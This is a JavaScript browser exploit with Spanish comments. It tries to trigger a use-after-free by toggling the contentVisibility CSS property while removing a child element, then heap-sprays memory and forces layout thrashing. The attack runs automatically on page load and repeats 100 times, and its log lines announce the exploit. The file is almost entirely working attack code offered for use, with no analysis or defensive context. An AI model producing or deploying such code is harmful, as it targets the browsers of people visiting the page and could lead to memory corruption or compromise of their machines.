function debug_log(msg) {
  const el = document.createElement("pre");
  el.textContent = msg;
  el.style = "color: lime; background: #111; margin: 2px; padding: 2px; font-family: monospace;";
  document.body.appendChild(el);
}

const container = document.querySelector(".container");
const child = document.querySelector(".child");

function heapSpray() {
  let spray = [];
  for (let i = 0; i < 0x40000; i++) {
    const arr = new Uint32Array(0x100);
    arr.fill(0x41414141);
    spray.push(arr);
  }
  return spray;
}

function layoutThrash() {
  const el = document.createElement("div");
  el.style.cssText = "position:absolute; left:0; top:0; width:100px; height:100px; transition:all 0.05s ease;";
  document.body.appendChild(el);
  for (let i = 0; i < 50; i++) {
    el.style.width = (i % 2 === 0) ? "100px" : "120px";
  }
}

function triggerUAF() {
  if (!container || !child) {
    debug_log("[-] Missing container or child.");
    return;
  }

  container.style.contentVisibility = "hidden";
  child.remove();

  setTimeout(() => {
    container.style.contentVisibility = "auto";
    heapSpray();
    layoutThrash();
    debug_log("[+] UAF triggered, memory sprayed.");
  }, 0);
}

function repeatTrigger(count) {
  let i = 0;
  const interval = setInterval(() => {
    if (i++ >= count) return clearInterval(interval);
    triggerUAF();
  }, 30); // Ajustable para más agresividad
}

// 🔥 Ejecutar automáticamente al cargar
window.onload = () => {
  debug_log("[*] Página cargada. Iniciando exploit...");
  repeatTrigger(100);
};
